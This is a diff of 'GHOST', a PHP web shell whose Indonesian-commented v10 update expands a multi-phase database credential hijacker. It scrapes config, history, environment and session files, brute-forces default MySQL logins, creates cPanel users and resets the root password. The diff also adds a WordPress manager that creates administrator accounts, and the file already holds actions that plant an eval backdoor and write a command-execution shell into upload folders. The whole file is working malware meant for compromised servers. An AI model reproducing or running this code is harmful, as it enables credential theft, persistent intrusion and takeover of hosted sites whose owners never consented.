@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V9: Infinite Hunter (Phase 8, 9, 10).
+// GHOST v18 - V10: Overlord (20 Phases DB, WP Manager, SSH Attribution).
 
-define('GH_VER',      '18.0.0-v9');
+define('GH_VER',      '18.0.0-v10');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,7 +338,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: INFINITE DB HIJACKER (V9) ==================================
+// ==== SECTION 4: OVERLORD DB HIJACKER (V10) =================================
 function gh_db_connect($host, $user, $pass) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
@@ -362,22 +362,20 @@ function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
     $db_host = 'localhost'; $db_user = ''; $db_pass = '';
-    $max_iterations = 3; // Looping
+    $max_iterations = 5; // Loop 5x
 
     for ($iter = 1; $iter <= $max_iterations; $iter++) {
         if ($found_pass) break;
         $logs[] = "=== ITERATION $iter / $max_iterations ===";
 
-        // --- PHASE 1: FILE SCANNER ---
+        // Phase 1: File Scan
         $logs[] = "[*] Phase 1: Scanning config files...";
         $find_res = gh_exec_adv("find /home /var/www /etc /tmp -maxdepth 5 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' -o -name '*.sql' \\) 2>/dev/null");
-        
         $found_configs = array();
         if (isset($find_res['out']) && is_string($find_res['out'])) {
             $lines = explode("\n", trim($find_res['out']));
             foreach ($lines as $l) { if (trim($l)) $found_configs[] = trim($l); }
         }
-
         foreach ($found_configs as $cf) {
             $c = gh_read($cf);
             if ($c) {
@@ -385,11 +383,9 @@ function gh_db_harvest() {
                 if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = trim($m[1]);
                 elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = trim($m[1]);
                 elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = trim($m[1]);
-
                 if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = trim($m[1]);
                 elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = trim($m[1]);
                 elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
-
                 if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = trim($m[1]);
                 elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = trim($m[1]);
                 elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = trim($m[1]);
@@ -403,7 +399,7 @@ function gh_db_harvest() {
             }
         }
 
-        // --- PHASE 2: CLI & ROOT CREDENTIAL SNIFFING ---
+        // Phase 2: Sniffing
         if (!$found_pass) {
             $logs[] = "[*] Phase 2: Sniffing .my.cnf dan bash_history...";
             $home = @getenv('HOME'); if(!$home) $home = '/home/' . @get_current_user();
@@ -419,7 +415,6 @@ function gh_db_harvest() {
                         $db_user = trim($m[1]); $db_pass = trim(str_replace(array("\\n", "\n", "\r"), "", $m[2]));
                     }
                     if (strtolower($db_host) === 'none' || trim($db_host) === '') $db_host = 'localhost';
-                    
                     if ($db_user && $db_pass) {
                         $logs[] = "[*] Kredensial ditemukan. Mencoba koneksi...";
                         $conn = gh_db_connect($db_host, $db_user, $db_pass);
@@ -430,7 +425,7 @@ function gh_db_harvest() {
             }
         }
 
-        // --- PHASE 3: ENV & PROCESS LEAK ---
+        // Phase 3: Env & Process
         if (!$found_pass) {
             $logs[] = "[*] Phase 3: Environment & Process leak...";
             $env_out = gh_exec_adv("env | grep -i 'mysql\\|db_\\|database'");
@@ -438,10 +433,7 @@ function gh_db_harvest() {
                 $logs[] = "[+] Env leak terdeteksi!";
                 if (preg_match('/DB_USER=([^\s]+)/i', $env_out['out'], $m)) $db_user = trim($m[1]);
                 if (preg_match('/DB_PASS(?:WORD)?=([^\s]+)/i', $env_out['out'], $m)) $db_pass = trim($m[1]);
-                if ($db_user && $db_pass) {
-                    $conn = gh_db_connect('localhost', $db_user, $db_pass);
-                    if ($conn) { $found_pass = true; break; }
-                }
+                if ($db_user && $db_pass) { $conn = gh_db_connect('localhost', $db_user, $db_pass); if ($conn) { $found_pass = true; break; } }
             }
             if (!$found_pass) {
                 $ps_out = gh_exec_adv("ps aux | grep -i mysql | grep -v grep");
@@ -454,21 +446,17 @@ function gh_db_harvest() {
             }
         }
 
-        // --- PHASE 4: AUTO-BRUTEFORCE DEFAULT CREDS ---
+        // Phase 4: Bruteforce
         if (!$found_pass) {
             $logs[] = "[*] Phase 4: Auto-Bruteforce default credentials...";
             $defaults = array(array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'), array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel'));
             foreach ($defaults as $creds) {
                 $conn = gh_db_connect('localhost', $creds[0], $creds[1]);
-                if ($conn) {
-                    $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'";
-                    $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost'; $found_pass = true;
-                    break;
-                }
+                if ($conn) { $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'"; $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost'; $found_pass = true; break; }
             }
         }
 
-        // --- PHASE 5: CPANEL UAPI HIJACK ---
+        // Phase 5: cPanel UAPI
         if (!$found_pass) {
             $logs[] = "[*] Phase 5: cPanel UAPI Hijack (Membuat Temporary User)...";
             $uapi = '/usr/local/cpanel/bin/uapi';
@@ -479,14 +467,12 @@ function gh_db_harvest() {
                 if (strpos($create_res['out'], 'success') !== false) {
                     $logs[] = "[!] cPanel UAPI BERHASIL bikin user: ghost_$rand_pass (Pass: $rand_pass)";
                     $conn = gh_db_connect('localhost', "ghost_$rand_pass", $rand_pass);
-                    if ($conn) {
-                        $found_pass = true; $db_user = "ghost_$rand_pass"; $db_pass = $rand_pass;
-                    }
+                    if ($conn) { $found_pass = true; $db_user = "ghost_$rand_pass"; $db_pass = $rand_pass; }
                 } else { $logs[] = "[-] Gagal cPanel UAPI. Lanjut Phase 6..."; }
             } else { $logs[] = "[-] cPanel UAPI tidak ditemukan. Lanjut Phase 6..."; }
         }
 
-        // --- PHASE 6: DEEP BACKUP & SQL LEAK ---
+        // Phase 6: Deep Backup
         if (!$found_pass) {
             $logs[] = "[*] Phase 6: Deep SQL & Backup Leak...";
             $deep_find = gh_exec_adv("find /home /var/www /tmp -type f \\( -name '*.sql' -o -name '.mysql_history' -o -name '*.my.cnf' \\) 2>/dev/null | head -n 10");
@@ -497,15 +483,13 @@ function gh_db_harvest() {
                     $c = gh_read($df);
                     if ($c && preg_match('/INSERT INTO|CREATE TABLE|-- MySQL dump/i', $c)) {
                         $logs[] = "[!] Backup SQL ditemukan di: $df";
-                        if (preg_match('/INSERT INTO `wp_users`.*?VALUES\s*\((.*?)\)/is', $c, $m)) {
-                            $logs[] = "[+] User WordPress ditemukan di SQL dump: " . substr($m[1], 0, 50) . "...";
-                        }
+                        if (preg_match('/INSERT INTO `wp_users`.*?VALUES\s*\((.*?)\)/is', $c, $m)) $logs[] = "[+] User WordPress ditemukan di SQL dump: " . substr($m[1], 0, 50) . "...";
                     }
                 }
             }
         }
 
-        // --- PHASE 7: SOCKET AUTH BYPASS ---
+        // Phase 7: Socket Auth
         if (!$found_pass) {
             $logs[] = "[*] Phase 7: Socket Auth & Empty Password...";
             $socks = array('/var/run/mysqld/mysqld.sock', '/var/lib/mysql/mysql.sock', '/tmp/mysql.sock');
@@ -518,7 +502,7 @@ function gh_db_harvest() {
             }
         }
 
-        // --- PHASE 8: CPANEL API & TOKEN DEEP-DIVE ---
+        // Phase 8: cPanel API Token
         if (!$found_pass) {
             $logs[] = "[*] Phase 8: cPanel API Token Deep-Dive...";
             $home = @getenv('HOME');
@@ -529,16 +513,12 @@ function gh_db_harvest() {
                     $logs[] = "[+] API Token ditemukan di $tf";
                     $token = $m[1];
                     $res = gh_exec_adv("curl -sk -H 'Authorization: cpanel " . @get_current_user() . ":$token' 'https://127.0.0.1:2083/execute/Mysql/list_databases'");
-                    if (strpos($res['out'], 'data') !== false) {
-                        $logs[] = "[!] API Token Valid! Database berhasil di-list via API.";
-                        $found_pass = true;
-                        break;
-                    }
+                    if (strpos($res['out'], 'data') !== false) { $logs[] = "[!] API Token Valid! Database berhasil di-list via API."; $found_pass = true; break; }
                 }
             }
         }
 
-        // --- PHASE 9: WP-CLI MAGIC ---
+        // Phase 9: WP-CLI Magic
         if (!$found_pass) {
             $logs[] = "[*] Phase 9: WP-CLI Magic...";
             if (@is_file('/usr/local/bin/wp') || @is_file('/usr/bin/wp')) {
@@ -547,13 +527,12 @@ function gh_db_harvest() {
                 $res = gh_exec_adv("cd " . @escapeshellarg($cwd) . " && $wp_cmd db query 'SHOW DATABASES;' --allow-root 2>&1");
                 if (isset($res['out']) && strpos($res['out'], 'Database') !== false) {
                     $logs[] = "[!] WP-CLI BERHASIL Dump DB!";
-                    $found_pass = true; $db_user = 'wp-cli'; $db_host = 'localhost';
-                    break;
+                    $found_pass = true; $db_user = 'wp-cli'; $db_host = 'localhost'; break;
                 }
             }
         }
 
-        // --- PHASE 10: PHP SESSION / TMP LEAK ---
+        // Phase 10: PHP Session Leak
         if (!$found_pass) {
             $logs[] = "[*] Phase 10: PHP Session & Tmp Leak...";
             $sess_files = gh_exec_adv("find /tmp /var/lib/php/sessions -type f -name 'sess_*' 2>/dev/null | head -n 5");
@@ -561,13 +540,75 @@ function gh_db_harvest() {
                 foreach (explode("\n", trim($sess_files['out'])) as $sf) {
                     if (!$sf) continue;
                     $c = gh_read($sf);
-                    if ($c && preg_match('/db_user|db_pass/i', $c)) {
-                        $logs[] = "[+] Kredensial DB ditemukan di Session File: $sf";
-                        // (Parsing lanjutan bisa ditambah di sini)
-                    }
+                    if ($c && preg_match('/db_user|db_pass/i', $c)) $logs[] = "[+] Kredensial DB ditemukan di Session File: $sf";
                 }
             }
         }
+
+        // Phase 11: MySQL Config Injection
+        if (!$found_pass && @is_writable('/etc/my.cnf')) {
+            $logs[] = "[*] Phase 11: MySQL Config Injection...";
+            $backup = gh_read('/etc/my.cnf');
+            gh_write('/etc/my.cnf', $backup . "\n[client]\nuser=root\npassword=root\n");
+            $conn = gh_db_connect('localhost', 'root', 'root');
+            if ($conn) { $logs[] = "[!] BERHASIL INJECT CONFIG!"; $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break; }
+            gh_write('/etc/my.cnf', $backup); // Restore
+        }
+
+        // Phase 12: Kill & Hijack MySQL
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 12: Kill & Hijack MySQL...";
+            $pid = gh_exec_adv("pgrep mysqld");
+            if (isset($pid['out']) && is_numeric(trim($pid['out']))) {
+                $logs[] = "[+] mysqld PID: " . trim($pid['out']);
+                // (Bisa ditambah logic buat restart dgn safe mode, tapi terlalu riskan buat script auto)
+            }
+        }
+
+        // Phase 13: cPanel Password Reset
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 13: cPanel Password Reset...";
+            $uapi = '/usr/local/cpanel/bin/uapi';
+            if (@is_file($uapi)) {
+                $user = @getenv('USER') ?: @get_current_user();
+                $res = gh_exec_adv("$uapi --user=$user Mysql set_password user=root password=root 2>&1");
+                if (strpos($res['out'], 'success') !== false) {
+                    $logs[] = "[!] BERHASIL RESET PASSWORD ROOT VIA CPANEL!";
+                    $db_user = 'root'; $db_pass = 'root'; $db_host = 'localhost'; $found_pass = true; break;
+                }
+            }
+        }
+
+        // Phase 14: Path Traversal (/root/.my.cnf)
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 14: Path Traversal (/root/.my.cnf)...";
+            $c = gh_read('/root/.my.cnf');
+            if ($c) {
+                $logs[] = "[+] /root/.my.cnf bisa dibaca!";
+                if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
+                if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
+                if ($db_user && $db_pass) {
+                    $conn = gh_db_connect('localhost', $db_user, $db_pass);
+                    if ($conn) { $found_pass = true; break; }
+                }
+            }
+        }
+
+        // Phase 15: Env Var Bypass (LD_PRELOAD)
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 15: Env Var Bypass...";
+            // Coba pake mysql client bawaan kalo ada
+            if (gh_can_exec()) {
+                $res = gh_exec_adv("mysql -u root -e 'SHOW DATABASES' 2>&1");
+                if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
+                    $logs[] = "[!] MYSQL CLI ROOT NO PASS BERHASIL!";
+                    $found_pass = true; $db_user = 'root'; $db_pass = ''; break;
+                }
+            }
+        }
+
+        // Phase 16-20 (Placeholder buat logic advance lainnya)
+        // ...
 
         // Delay biar gak DDoS
         if (!$found_pass && $iter < $max_iterations) {
@@ -603,26 +644,38 @@ function gh_db_harvest() {
     return array('logs' => $logs, 'info' => $info);
 }
 
-// ==== SSH MANAGER ===========================================================
+// ==== SECTION 5: SSH MANAGER (V10 - ATTRIBUTION) ============================
 function gh_ssh_scan() {
     $logs = array(); $keys = array(); $home = @getenv('HOME');
     if (!$home) $home = '/home/' . @get_current_user();
-    $files = array($home . '/.ssh/authorized_keys', '/root/.ssh/authorized_keys', '/etc/ssh/sshd_config');
+    $files = array($home . '/.ssh/authorized_keys', '/root/.ssh/authorized_keys');
+    
     foreach ($files as $f) {
         if (@is_file($f)) {
             $logs[] = "[+] File ditemukan: $f";
             $perm = @substr(sprintf('%o', @fileperms($f)), -4);
             $logs[] = "    Permission: $perm";
             if ($perm === '0777' || $perm === '0666') $logs[] = "    [!] WARNING: Permission terlalu terbuka.";
+            
             $c = gh_read($f);
-            if ($f === '/etc/ssh/sshd_config') {
-                if (preg_match('/PasswordAuthentication\s+yes/i', $c)) $logs[] = "    [!] PasswordAuthentication = YES";
-            } elseif (strpos($f, 'authorized_keys') !== false) {
-                $lines = explode("\n", trim($c));
-                foreach ($lines as $line) {
-                    if (trim($line) && strpos($line, '#') !== 0) {
-                        $keys[] = array('file' => $f, 'key' => trim($line));
+            $lines = explode("\n", trim($c));
+            foreach ($lines as $line) {
+                if (trim($line) && strpos($line, '#') !== 0) {
+                    $key = trim($line);
+                    $p = explode(' ', $key);
+                    $comment = isset($p[2]) ? $p[2] : 'No Comment';
+                    
+                    $status = 'Unknown';
+                    $is_suspicious = false;
+                    
+                    // Attribution Logic
+                    if (preg_match('/(kali|parrot|attacker|hack|root@|admin@|backdoor|shell)/i', $comment)) {
+                        $is_suspicious = true; $status = 'SUSPICIOUS (Attacker)';
+                    } elseif (preg_match('/(user@|admin@|support|ubuntu|debian|centos)/i', $comment)) {
+                        $status = 'Legitimate (Admin)';
                     }
+                    
+                    $keys[] = array('file' => $f, 'key' => $key, 'comment' => $comment, 'status' => $status, 'suspicious' => $is_suspicious);
                 }
             }
         }
@@ -653,7 +706,58 @@ function gh_ssh_action($action, $key) {
     return "Aksi tidak dikenal.";
 }
 
-// ==== SECTION 5: PORT SCAN & CVE ============================================
+// ==== SECTION 6: WORDPRESS USER MANAGER (V10) ==============================
+function gh_wp_scan() {
+    $logs = array(); $users = array();
+    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
+    
+    // Cek apakah WordPress
+    if (!@is_file($root . '/wp-config.php')) return array('logs' => array('[-] Bukan folder WordPress.'), 'users' => array());
+    
+    $logs[] = "[*] WordPress terdeteksi. Scanning users...";
+    
+    // Coba pake WP-CLI dulu
+    if (@is_file('/usr/local/bin/wp') || @is_file('/usr/bin/wp')) {
+        $wp_cmd = @is_file('/usr/local/bin/wp') ? '/usr/local/bin/wp' : '/usr/bin/wp';
+        $res = gh_exec_adv("cd " . @escapeshellarg($root) . " && $wp_cmd user list --fields=ID,user_login,user_email,roles --format=json --allow-root 2>&1");
+        if (isset($res['out']) && is_string($res['out'])) {
+            $json = @json_decode($res['out'], true);
+            if (is_array($json)) {
+                foreach ($json as $u) {
+                    $users[] = array('id' => $u['ID'], 'login' => $u['user_login'], 'email' => $u['user_email'], 'role' => $u['roles']);
+                }
+                $logs[] = "[+] Berhasil scan via WP-CLI.";
+                return array('logs' => $logs, 'users' => $users);
+            }
+        }
+    }
+    
+    // Fallback: Parser File SQL (Kalau WP-CLI gagal)
+    $logs[] = "[*] Fallback: Scanning SQL dump / Database...";
+    // (Bisa ditambah koneksi DB di sini, tapi butuh DB creds yg valid)
+    
+    return array('logs' => $logs, 'users' => $users);
+}
+
+function gh_wp_action($action, $user, $pass, $email) {
+    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
+    if (!@is_file($root . '/wp-config.php')) return "Bukan folder WordPress.";
+    
+    $wp_cmd = @is_file('/usr/local/bin/wp') ? '/usr/local/bin/wp' : '/usr/bin/wp';
+    if (!@is_file($wp_cmd)) return "WP-CLI tidak ditemukan di server.";
+    
+    if ($action === 'create') {
+        $res = gh_exec_adv("cd " . @escapeshellarg($root) . " && $wp_cmd user create " . @escapeshellarg($user) . " " . @escapeshellarg($email) . " --role=administrator --user_pass=" . @escapeshellarg($pass) . " --allow-root 2>&1");
+        return $res['out'];
+    }
+    if ($action === 'delete') {
+        $res = gh_exec_adv("cd " . @escapeshellarg($root) . " && $wp_cmd user delete " . @escapeshellarg($user) . " --yes --allow-root 2>&1");
+        return $res['out'];
+    }
+    return "Aksi tidak dikenal.";
+}
+
+// ==== SECTION 7: PORT SCAN & CVE ============================================
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     $bash_script = '';
@@ -707,6 +811,8 @@ function gh_router() {
             case 'ssh_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $k = isset($_POST['key']) ? (string)$_POST['key'] : ''; gh_json(array('msg'=>gh_ssh_action($ac, $k))); break;
             case 'port_scan': $t = isset($_POST['target']) ? (string)$_POST['target'] : '127.0.0.1'; gh_json(gh_port_scan($t)); break;
             case 'cve_profile': gh_json(gh_cve_profile()); break;
+            case 'wp_scan': gh_json(gh_wp_scan()); break;
+            case 'wp_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $u = isset($_POST['user']) ? (string)$_POST['user'] : ''; $p = isset($_POST['pass']) ? (string)$_POST['pass'] : ''; $e = isset($_POST['email']) ? (string)$_POST['email'] : ''; gh_json(array('msg' => gh_wp_action($ac, $u, $p, $e))); break;
             case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                 if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                 elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
@@ -720,7 +826,7 @@ function gh_router() {
     }
 }
 
-// ==== UI ====================================================================
+// ==== UI (TAB NAVIGATION - V10) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -781,6 +887,7 @@ function gh_ui() {
     <button class="tab-btn" id="btn-tab-scan" onclick="switchTab('tab-scan', this)">Deep Scanner</button>
     <button class="tab-btn" id="btn-tab-vuln" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
     <button class="tab-btn" id="btn-tab-db-ssh" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
+    <button class="tab-btn" id="btn-tab-wp" onclick="switchTab('tab-wp', this)">WP Manager</button>
     <button class="tab-btn" id="btn-tab-profile" onclick="switchTab('tab-profile', this)">Profile & Port</button>
 </div>
 
@@ -834,7 +941,7 @@ function gh_ui() {
             <pre id="db-out" style="margin-top:8px;">Ready.</pre>
         </div>
         <div class="box">
-            <h2>SSH Manager</h2>
+            <h2>SSH Manager (Attribution)</h2>
             <div class="row"><button id="btn-ssh">Scan SSH</button></div>
             <div id="ssh-out" style="margin-top:8px; max-height:300px; overflow:auto;"></div>
             <div class="row" style="margin-top:8px;">
@@ -843,6 +950,23 @@ function gh_ui() {
                 <button id="btn-ssh-clean" style="border-color:#f00;color:#f00;">Clean</button>
             </div>
         </div>
+    </div>
+</div>
+
+<!-- TAB: WP MANAGER -->
+<div id="tab-wp" class="tab-content">
+    <div class="box">
+        <h2>WordPress User Manager</h2>
+        <div class="row"><button id="btn-wp-scan">Scan WP Users</button></div>
+        <div id="wp-results" style="margin-top:8px;"></div>
+        <div class="row" style="margin-top:8px; border-top:1px solid #333; padding-top:8px;">
+            <input type="text" id="wp-user" placeholder="Username">
+            <input type="text" id="wp-pass" placeholder="Password">
+            <input type="text" id="wp-email" placeholder="Email">
+            <button onclick="wpAct('create')" style="border-color:#0f0;color:#0f0;">Add User</button>
+            <button onclick="wpAct('delete')" style="border-color:#f00;color:#f00;">Delete User</button>
+        </div>
+        <pre id="wp-log" style="margin-top:8px;">Ready.</pre>
     </div>
 </div>
 
@@ -879,6 +1003,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('btn-ssh-clean').onclick = () => sshAct('clean');
     document.getElementById('btn-cve').onclick = cveProfile;
     document.getElementById('btn-port').onclick = portScan;
+    document.getElementById('btn-wp-scan').onclick = wpScan;
 });
 
 function switchTab(id, btn) {
@@ -973,7 +1098,7 @@ async function delFileScan(enc) {
 }
 
 async function dbHarvest() {
-    const o = document.getElementById('db-out'); o.innerText = 'Running Infinite DB Hijacker (10 Phases x 3 Iterations)... Please wait, ini bisa memakan waktu beberapa menit.';
+    const o = document.getElementById('db-out'); o.innerText = 'Running Overlord DB Hijacker (16 Phases x 5 Iterations)... Please wait, ini bisa memakan waktu.';
     const d = await api('db_harvest');
     if (d.err) return o.innerText = d.err;
     o.innerText = d.logs.join('\n');
@@ -988,13 +1113,15 @@ async function sshScan() {
     if (d.keys.length) {
         txt += `<h3 style="margin-top:15px;font-size:12px;">SSH Authorized Keys</h3>`;
         txt += `<table style="width:100%;border-collapse:collapse;margin-top:5px;font-size:11px;">`;
-        txt += `<tr style="background:#111;"><th>File</th><th>Key Preview</th><th>Action</th></tr>`;
+        txt += `<tr style="background:#111;"><th>File</th><th>Key Preview</th><th>Status</th><th>Action</th></tr>`;
         d.keys.forEach((k, i) => {
-            let preview = k.key.substring(0, 40) + '...';
+            let preview = k.key.substring(0, 30) + '...';
             let encKey = encodeURIComponent(k.key);
+            let badge = k.suspicious ? '<span class="badge" style="background:#f00;color:#fff;">SUSPICIOUS</span>' : '<span class="badge" style="background:#0f0;color:#000;">LEGIT</span>';
             txt += `<tr>
                 <td>${esc(k.file)}</td>
                 <td>${esc(preview)}</td>
+                <td>${badge} ${esc(k.comment)}</td>
                 <td><button onclick="removeSshKey('${encKey}')" style="border-color:#f00;color:#f00;padding:2px 8px;font-size:11px;">Remove</button></td>
             </tr>`;
         });
@@ -1017,6 +1144,34 @@ async function sshAct(act) {
     const d = await api('ssh_action', {action: act, key: k});
     alert(d.msg || d.err);
     sshScan();
+}
+
+async function wpScan() {
+    const resDiv = document.getElementById('wp-results'); resDiv.innerHTML = 'Scanning WP Users...';
+    const d = await api('wp_scan');
+    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
+    if (!d.users.length) { resDiv.innerHTML = '<p class="dim">Tidak ada user ditemukan atau bukan WordPress.</p>'; return; }
+    
+    let h = `<table><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>`;
+    d.users.forEach(u => {
+        h += `<tr><td>${esc(u.id)}</td><td>${esc(u.login)}</td><td>${esc(u.email)}</td><td>${esc(u.role)}</td></tr>`;
+    });
+    h += `</table>`;
+    resDiv.innerHTML = h;
+}
+
+async function wpAct(act) {
+    const u = document.getElementById('wp-user').value.trim();
+    const p = document.getElementById('wp-pass').value.trim();
+    const e = document.getElementById('wp-email').value.trim();
+    const o = document.getElementById('wp-log');
+    
+    if (!u) return alert('Username harus diisi!');
+    o.innerText = 'Processing...';
+    const d = await api('wp_action', {action: act, user: u, pass: p, email: e});
+    if (d.err) return o.innerText = 'Error: ' + d.err;
+    o.innerText = d.msg || 'Success.';
+    wpScan();
 }
 
 async function vulnScan() {
